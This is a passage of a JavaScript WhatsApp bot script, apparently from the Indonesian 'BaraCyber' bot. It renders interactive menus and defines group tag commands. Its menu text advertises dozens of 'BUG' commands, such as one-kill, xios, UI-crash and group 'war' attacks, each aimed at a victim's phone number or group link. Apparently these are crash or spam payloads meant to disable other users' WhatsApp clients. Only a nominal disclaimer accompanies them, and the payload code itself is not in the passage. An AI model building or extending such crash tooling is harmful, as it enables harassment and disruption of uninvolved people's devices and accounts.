*[ 🇮🇩 ] ᴊᴀɴɢᴀɴ ᴅɪsᴀʟᴀʜ ɢᴜɴᴀᴋᴀɴ ᴘᴀᴅᴀ ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ, ᴊɪᴋᴀ ᴍᴇʟᴀᴋᴜᴋᴀɴɴʏᴀ sɪᴀᴘ ᴍᴇɴᴇʀɪᴍᴀ ᴀᴋɪʙᴀᴛɴʏᴀ*

\`[ ɪɴɢ ]\`
*[ 🇬🇧 ] ᴅᴏ ɴᴏᴛ ᴜsᴇ ɪᴛ ᴏɴ ɪɴɴᴏᴄᴇɴᴛ ᴘᴇᴏᴘʟᴇ, ɪ.ғ ᴛʜᴇʏ ᴀʀᴇ ᴘʀᴇᴘᴀʀᴇᴅ ᴛᴏ ᴀᴄᴄᴇᴘᴛ ᴛʜᴇ ᴄᴏɴsᴇǫᴜᴇɴᴄᴇs.*

┏━━━━━ \`DEVELOPER\` ━━━━┓
┃------------\`BARACYBER\`----------  
┃----------\`t.me//BaraSepuh\`------ 
┗━━━━━════✞════━━━━━━┛`
let sections = [{
title: '# 𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬',
highlight_label: 'LIST MENU BaraCyber',
rows: [{
title: 'MENU',
description: `[ # ] MENAMPILKAN MENU`, 
id: '.BaraCyber'
}, 
{
title: '#ALL MENU',
description: `[ # ] MENAMPILKAN ALL MENU`, 
id: '.allmenu'
}, 
{
title: '#MAIN MENU',
description: `[ # ] MENAMPILKAN MAIN MENU`, 
id: '.mainmenu'
},
{
title: '#AI MENU',
description: `[ # ] MENAMPILKAN AI MENU`, 
id: '.aimenu'
},
{
title: '#GROUP MENU', 
description: `[ # ] MENAMPILKAN GROUP MENU`,
id: 'groupmenu', 
},
{
title: '#STORE MENU',
description: `[ # ] MENAMPILKAN STORE MENU`, 
id: '.storemenu'
}, 
{
title: '#TOOLS MENU',
description: `[ # ] MENAMPILKAN TOOLS MENU`, 
id: '.toolsmenu'
},
{
title: '#BUG MENU',
description: `[ # ] MENAMPILKAN BUG MENU`, 
id: '.bugmenu'
    }]
     }]
let listMessage = {
    title: 'Klik Disini🌀', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: groupmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: '© BaraCyber'
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./image/nulll.jpg")}, { upload: BaraCybeer.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"MY YOUTUBE\",\"url\":\"https://youtube.con/@Baradeveloper_\",\"merchant_url\":\"https://youtube.con/@Baradeveloper_\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await BaraCybeer.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

      case 'allmenu': 
      case 'allcmd': {
reactemoji('🔄')
await loading()
const version = require("baileys/package.json").version
const menu = `╭━╍╍╍╍╍╍╍╍ ✞ ╍╍╍╍
│ ﹎✞ © BaraCyber ✞
╰─┉┉┉┅┅┅✞┉┉┉┉┅┉┅┅


╭────ꕥ *𝙄𝙉𝙁𝙊 𝘽𝙊𝙏* ꕥ────
│✞   𝙉𝙖𝙢𝙖 𝘽𝙤𝙩 : ${namabot}
│◦   𝙍𝙪𝙣𝙩𝙞𝙢𝙚 : ${run}
│◦   𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : ${versisc}
│✞  𝘾𝙧𝙚𝙖𝙩𝙤𝙧 : ${namaCreator}
└──ꕥ

✞ ────────𖣘───────── ✞
  ┆ </> \`[ TOOLS MENU ]\` </>
✞ ────────𖣘───────── ✞
╭┈──────────────────𖣘
│  ◦  .ᴇɴᴄ <ᴄᴏᴅᴇ>
│  ◦  .ᴇɴᴄʀʏᴘᴛ <ᴄᴏᴅᴇ>
│  ◦  .ʟᴏᴄᴋᴏᴛᴘ <ᴊᴜᴍʟᴀʜ|ɴᴜᴍʙᴇʀ>
╰┈────────────────𖣘

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ DOWNMENU ]\` </>
✞ ─────────𖣘──────── ✞
╭┈──────────────────𖣘
│  ◦  .ᴛᴛ
│  ◦  .ᴛᴛᴍᴘ3
│  ◦  .ᴛɪᴋᴛᴏᴋ
╰┈────────────────𖣘

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ AI MENU ]\` </>
✞ ─────────𖣘──────── ✞
╭┈──────────────────𖣘
│  ◦  .ʜᴅᴢ-ᴀɪ
╰┈────────────────𖣘

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ MAIN MENU ]\` </>
✞ ─────────𖣘──────── ✞
╭┈──────────────────𖣘
│  ◦  .ǫᴄ < ǫᴜᴇʀʏ >
│  ◦  .sᴛɪᴋᴇʀ < ʀᴇᴘʟʏ/ɪᴍᴀɢᴇ >
│  ◦  .ʜᴅ < ɪᴍᴀɢᴇ >
│  ◦  .ʜᴅɪᴍɢ < ɪᴍᴀɢᴇ >
│  ◦  .ʜᴅʀ < ɪᴍᴀɢᴇ >
│  ◦  .ʀᴇᴍɪɴɪ < ɪᴍᴀɢᴇ >
│  ◦  .ᴘᴀɴᴇʟᴍᴇɴᴜ
│  ◦  .sᴄ 
╰┈────────────────𖣘

𖣘 ───────────────── 𖣘
  ┆ </> \`[ GROUP MENU ]\` </>
𖣘 ───────────────── 𖣘

╭┈──────────────────𖣘
│  ◦  .ʜɪᴅᴇᴛᴀɢ <ǫᴜᴇʀʏ>
│  ◦  .ᴛᴀɢᴀʟʟ <ǫᴜᴇʀʏ>
│  ◦  .ᴋɪᴄᴋ <ᴛᴀɢ>
│  ◦  .ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢ>
│  ◦  .ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢ>
╰┈────────────────𖣘

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ STORE MENU ]\` </>
✞ ─────────𖣘──────── ✞
╭┈──────────────────𖣘
│  ◦  .ᴘᴀʏᴍᴇɴᴛ 
│  ◦  .ᴅᴀɴᴀᴍᴀsᴜᴋ
│  ◦  .ᴘʀᴏsᴇs
│  ◦  .ᴅᴏɴᴇ
│  ◦  .ᴊᴘᴍᴘʀᴏᴍᴏsɪ 
│  ◦  .ᴊᴘᴍ3
╰┈────────────────𖣘

✞ ────────𖣘───────── ✞
  ┆ </> \`[ PANEL MENU ]\` </>
✞ ────────𖣘───────── ✞
╭┈──────────────────𖣘
│  ◦  .1ɢʙ
│  ◦  .2ɢʙ
│  ◦  .3ɢʙ
│  ◦  .4ɢʙ
│  ◦  .5ɢʙ
│  ◦  .6ɢʙ
│  ◦  .7ɢʙ
│  ◦  .8ɢʙ
│  ◦  .9ɢʙ
│  ◦  .ᴜɴʟɪ
│  ◦  .ʟɪsᴛsʀᴠ
│  ◦  .ᴅᴇʟsʀᴠ
╰┈────────────────𖣘

✞ ──────────𖣘─────── ✞
  ┆ </> \`[ BUG MENU ]\` </>
✞ ──────────𖣘─────── ✞
╭┈──────────────────𖣘
│  ◦  .sᴠʙ_ᴄᴜᴋ
│  ◦  .ʙᴀʀᴀ_ᴄɪᴘᴏᴋ
│  ◦  .ᴀɪɴɢ_ʙᴇʀᴅᴜᴋᴀ
│  ◦  .ʜᴀʟᴏ
│  ◦  .sᴀʏᴀɴɢ
│  ◦  .ᴛᴇs
│  ◦  .ᴛᴜʀᴜ_ᴅᴇᴋ
│  ◦  .bara_cyber
│  ◦  .ʜᴇᴠ
╰┈────────────────𖣘

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ V5 GEN 4 ]\` </>
✞ ─────────𖣘──────── ✞
╭┈──────────────────
│  ◦  .xbara <ɴᴜᴍʙᴇʀ>
╰┈────────────────•

𖣘 ───────────────── 𖣘
  ┆ </> \`[ V5 GEN 4 ]\` </>
𖣘 ───────────────── 𖣘
╭┈──────────────────
│  ◦  .xᴘᴀʏᴍᴇɴᴛ <ɴᴜᴍʙᴇʀ>
│  ◦  .xʙᴇᴛᴀ <ɴᴜᴍʙᴇʀ
│  ◦  .ᴏɴᴇ-sʜᴏᴛ <ɴᴜᴍʙᴇʀ>
│  ◦  .ᴏɴᴇ-ᴋɪʟʟ <ɴᴜᴍʙᴇʀ>
│  ◦  .ᴅᴏᴜʙʟᴇᴋɪʟʟ <ɴᴜᴍʙᴇʀ>
│  ◦  .ᴛʀɪᴘᴇxᴋɪʟʟ <ɴᴜᴍʙᴇʀ>
│  ◦  .ᴍᴀɴɪᴀᴄx <ɴᴜᴍʙᴇʀ>
│  ◦  .sᴀᴠᴀɢᴇx <ɴᴜᴍʙᴇʀ>
│  ◦  .xɪᴏs <ɴᴜᴍʙᴇʀ>
╰┈────────────────•

𖣘 ───────────────── 𖣘
  ┆ </> \`[ BUG SKIBIDI ]\` </>
𖣘 ───────────────── 𖣘
╭┈──────────────────
│  ◦  .sᴋɪʙɪᴅɪ_ɢʏᴀᴛ <ɴᴜᴍʙᴇʀ>
│  ◦  .sᴋɪʙɪᴅɪ_sɪɢᴍᴀ <ɴᴜᴍʙᴇʀ>
╰┈────────────────•

✞ ──────────𖣘─────── ✞
  ┆ </> \`[ BUG VIDEO ]\` </>
✞ ──────────𖣘─────── ✞
╭┈──────────────────𖣘
│  ◦  .ʙᴜɢᴠɪᴅ1 <ɴᴜᴍʙᴇʀ>
╰┈────────────────𖣘

𖣘 ───────────────── 𖣘
  ┆ </> \`[ BUG EMOJI ]\` </>
𖣘 ───────────────── 𖣘
╭┈──────────────────𖣘
│  ◦  .🔥 <ɴᴜᴍʙᴇʀ>
│  ◦  .🌹 <ɴᴜᴍʙᴇʀ>
│  ◦  .🌷 <ɴᴜᴍʙᴇʀ>
│  ◦  .⭐ <ɴᴜᴍʙᴇʀ>
│  ◦  .⚡ <ɴᴜᴍʙᴇʀ>
│  ◦  .💥 <ɴᴜᴍʙᴇʀ>
│  ◦  .💀 <ɴᴜᴍʙᴇʀ>
│  ◦  .🗿 <ɴᴜᴍʙᴇʀ>
│  ◦  .😈 <ɴᴜᴍʙᴇʀ>
╰┈────────────────𖣘

✞ ──────────𖣘─────── ✞
  ┆ </> \`[ BUG UI  ]\` </>
✞ ──────────𖣘─────── ✞
╭┈──────────────────𖣘
│  ◦  .bara-ᴜɪ <ɴᴜᴍʙᴇʀ>
│  ◦  .bara-ᴜɴʟɪᴍɪᴛᴇᴅ <ɴᴜᴍʙᴇʀ>
│  ◦  .bara-ɪɴғɪɴɪᴛʏ <ɴᴜᴍʙᴇʀ>
│  ◦  .bara-ᴜɪᴄʀᴀsʜ <ɴᴜᴍʙᴇʀ>
╰┈────────────────𖣘

✞ ────────𖣘───────── ✞
  ┆ </> \`[ BUG WAR ]\` </>
✞ ────────𖣘───────── ✞
╭┈──────────────────𖣘
│  ◦  .sɪɴɪ_ᴡᴀʀ <ɴᴜᴍʙᴇʀ, ᴊᴜᴍʟᴀʜ>
│  ◦  .ɢᴜᴀ_ʙᴀᴄᴏᴋ_ʟᴜ <ɴᴜᴍʙᴇʀ, ᴊᴜᴍʟᴀʜ>
│  ◦  .ᴀᴜᴀʜ_ɴɢᴀɴᴛᴜᴋ <ɴᴜᴍʙᴇʀ, ᴊᴜᴍʟᴀʜ>
│  ◦  .ᴄᴇɴᴛᴀɴɢ_sᴀᴛᴜ <ɴᴜᴍʙᴇʀ, ᴊᴜᴍʟᴀʜ>
│  ◦  .ʙᴀɴᴛᴀɪ_ʀɪᴘᴇʀ <ɴᴜᴍʙᴇʀ, ᴊᴜᴍʟᴀʜ>
│  ◦  .ᴀɴᴊᴀʏ_ᴀʟᴏᴋ <ɴᴜᴍʙᴇʀ, ᴊᴜᴍʟᴀʜ>
│  ◦  .ᴛᴇʟᴏʟᴇᴛ_ᴘʟᴇʀ <ɴᴜᴍʙᴇʀ, ᴊᴜᴍʟᴀʜ>
╰┈────────────────𖣘

✞ ────────𖣘───────── ✞
  ┆ </> \`[ BUG GROUP ]\` </>
✞ ────────𖣘───────── ✞
╭┈──────────────────𖣘
│  ◦  .ʙᴜɢ-ʙᴜᴛᴛᴏɴ <ʟɪɴᴋ>
│  ◦  .ʙᴜɢ-sɪᴛᴇxʏᴢ <ʟɪɴᴋ>
│  ◦  .ʙᴜᴛᴛᴏɴ-ɪɴᴛᴇʀɴᴀʟ <ʟɪɴᴋ>
│  ◦  .ʙᴜᴛᴛᴏɴ-ᴇxᴛᴇʀɴᴀʟ <ʟɪɴᴋ>
│  ◦  .ʙᴜɢ-ʜᴏʟᴇ <120###@g.ᴜs>
│  ◦  .ᴇɴᴇᴍʏɢʀᴏᴜᴘ <120###@g.ᴜs>
│  ◦  .ᴇxᴛᴇʀɴᴀʟ-ɢʀᴏᴜᴘ <120###@g.ᴜs>
╰┈────────────────𖣘

\`[ ɪɴᴅ ]\`
*[ 🇮🇩 ] ᴊᴀɴɢᴀɴ ᴅɪsᴀʟᴀʜ ɢᴜɴᴀᴋᴀɴ ᴘᴀᴅᴀ ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ, ᴊɪᴋᴀ ᴍᴇʟᴀᴋᴜᴋᴀɴɴʏᴀ sɪᴀᴘ ᴍᴇɴᴇʀɪᴍᴀ ᴀᴋɪʙᴀᴛɴʏᴀ*

\`[ ɪɴɢ ]\`
*[ 🇬🇧 ] ᴅᴏ ɴᴏᴛ ᴜsᴇ ɪᴛ ᴏɴ ɪɴɴᴏᴄᴇɴᴛ ᴘᴇᴏᴘʟᴇ, ɪ.ғ ᴛʜᴇʏ ᴀʀᴇ ᴘʀᴇᴘᴀʀᴇᴅ ᴛᴏ ᴀᴄᴄᴇᴘᴛ ᴛʜᴇ ᴄᴏɴsᴇǫᴜᴇɴᴄᴇs.*

┏━━━━━ \`DEVELOPER\` ━━━━┓
┃------------\`BARACYBER\`----------  
┃----------\`t.me//BaraSepuh\`------ 
┗━━━━━════✞════━━━━━━┛
`
let sections = [{
title: '# 𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬 24',
highlight_label: 'LIST MENU BaraCyber',
rows: [{
title: 'MENU',
description: `[ # ] MENAMPILKAN MENU`, 
id: '.BaraCyber'
}, 
{
title: '#ALL MENU',
description: `[ # ] MENAMPILKAN ALL MENU`, 
id: '.allmenu'
}, 
{
title: '#MAIN MENU',
description: `[ # ] MENAMPILKAN MAIN MENU`, 
id: '.mainmenu'
},
{
title: '#AI MENU',
description: `[ # ] MENAMPILKAN AI MENU`, 
id: '.aimenu'
},
{
title: '#GROUP MENU', 
description: `[ # ] MENAMPILKAN GROUP MENU`,
id: 'groupmenu', 
},
{
title: '#STORE MENU',
description: `[ # ] MENAMPILKAN STORE MENU`, 
id: '.storemenu'
}, 
{
title: '#TOOLS MENU',
description: `[ # ] MENAMPILKAN TOOLS MENU`, 
id: '.toolsmenu'
},
{
title: '#BUG MENU',
description: `[ # ] MENAMPILKAN BUG MENU`, 
id: '.bugmenu'
    }]
     }]
let listMessage = {
    title: 'Klik Disini🌀', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: menu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: '© BaraCyber'
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./image/Bara999.jpg")}, { upload: BaraCybeer.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"MY YOUTUBE\",\"url\":\"https://wa.me/6283896252486\",\"merchant_url\":\"https://wa.me/6283896252486\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await BaraCybeer.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break
// BATAS

//============= CASE GROUP =============//
case 'z': case 'hidetag':
//if (!isRegistered) return registerbut(noregis)
if (!isOwner) return reply(mess.only.owner)
if (!text) return reply(`Teks?`)
BaraCybeer.sendMessage(m.chat, { text : text ? text : '' , mentions: participants.map(a => a.id)}, { quoted: m })
break
case "tagall": {
if (!isOwner && !isAdmins) return reply(mess.admin)
if (!isGroup) return joreply(mess.only.group)
if (!q) return reply(`Teks Nya Mana Kak?`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎